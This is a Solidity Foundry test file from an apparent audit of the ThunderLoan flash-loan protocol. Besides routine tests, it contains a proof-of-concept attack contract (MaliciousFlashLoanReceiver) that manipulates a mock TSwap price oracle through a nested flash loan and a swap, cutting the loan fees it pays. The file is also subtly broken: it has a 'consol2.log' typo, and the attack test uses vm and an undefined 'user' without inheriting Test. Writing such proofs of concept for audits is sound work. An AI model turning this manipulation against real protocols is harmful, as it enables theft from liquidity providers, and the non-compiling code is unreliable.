// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from"../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    //AUDIT TIME TEST ADDED

function testRedeemAfterLoan() public setAllowedToken hasDeposits {
    uint256 amountToBorrow = AMOUNT * 10;

    // Calculate flashloan fee for amountToBorrow
    uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

    // User takes flashloan + receives fee payment minted
    vm.startPrank(user);
    tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);   // Mint fee
    thunderLoan.flashloan(
        address(mockFlashLoanReceiver),
        tokenA,
        amountToBorrow,
        ""
    );
    vm.stopPrank();
    //1000e18 initial deposit
//3e17 fee
//1000e18 + 3e17 = 10003e17
//1003.300900000000000000
// uint256 afterDepositRate = 1e18 + depositFee;      // 1.003e18
// uint256 afterFlashloanRate = afterDepositRate + flashFee; // 1.0033009e18


    // Liquidity provider redeems everything
    uint256 amountToRedeem = type(uint256).max;

    vm.startPrank(liquidityProvider);
    thunderLoan.redeem(tokenA, amountToRedeem);
    vm.stopPrank();
}

}

contract ThunderLoanOracleManipulationTest {
    ThunderLoan thunderLoan;
    ERC20Mock tokenA;
    ERC20Mock weth;
    address liquidityProvider = address(123);
    ERC1967Proxy proxy;

    function testOracleManipulation() public {
        // -------------------------------------------------------
        // 1. Setup contracts
        // -------------------------------------------------------
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        weth   = new ERC20Mock();

        proxy = new ERC1967Proxy(address(thunderLoan), "");

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));

        // Create a TSwap Pool between WETH / TokenA
        address tswapPool = pf.createPool(address(tokenA));

        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // -------------------------------------------------------
        // 2. Fund TSwap
        // -------------------------------------------------------
        vm.startPrank(liquidityProvider);

        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);

        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);

        BuffMockTSwap(tswapPool).deposit(
            100e18, // tokenA
            100e18, // weth
            100e18,
            block.timestamp
        );
        vm.stopPrank();

        // Ratio: 100 WETH : 100 TokenA (price = 1:1)

        // -------------------------------------------------------
        // 3. Fund ThunderLoan
        // -------------------------------------------------------
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // ThunderLoan now holds 1000 TokenA LP funds

        // -------------------------------------------------------
        // 4. Fee Comparison Setup
        // -------------------------------------------------------
        uint256 normalFeeCost =
            thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal Fee is:", normalFeeCost);
        // Example: 0.296147410319118389

        uint256 amountToBorrow = 50e18; // two flash loans attack

        // -------------------------------------------------------
        // 5. Deploy attacker contract
        // -------------------------------------------------------
        MaliciousFlashLoanReceiver flr =
            new MaliciousFlashLoanReceiver(
                tswapPool,
                address(thunderLoan),
                address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(flr),50e18);

        // Execute first attack flash loan
        thunderLoan.flashloan(
            address(flr),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();
        uint256 attackFee = flr.feeOne() +flr.feeTwo();
        consol2.log("Attack Fee is: ", attackFee);
        assert(attackFee < normalFeeCost);
    }
}
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan public thunderLoan;
    address public repayAddress;
    BuffMockTSwap public tswapPool;

    bool public attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(
        address _tswapPool,
        address _thunderLoan,
        address _repayAddress
    ) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /* params */
    )
        external
        override
        returns (bool)
    {
        IERC20 erc = IERC20(token);

        if (!attacked) {
            attacked = true;
            feeOne = fee;

            // 1. Calculate amount of WETH we will get
            uint256 wethBought =
                tswapPool.getOutputAmountBasedOnInput(
                    50e18,
                    100e18,
                    100e18
                );

            // Approve & swap TokenA → WETH
            erc.approve(address(tswapPool), 50e18);

            tswapPool.swapPoolTokenForWethBasedOnInput(
                50e18,
                wethBought,
                block.timestamp
            );

            // 2. Take out second flash loan
            thunderLoan.flashloan(
                address(this),
                IERC20(token),
                amount,
                ""
            );

            // // Repay first loan
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
IERC20(token).transfer(address(repayAddress),amount+fee );
        } else {
            // Second loan path
            feeTwo = fee;

            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress),amount+fee );

        }

        return true;
    }
}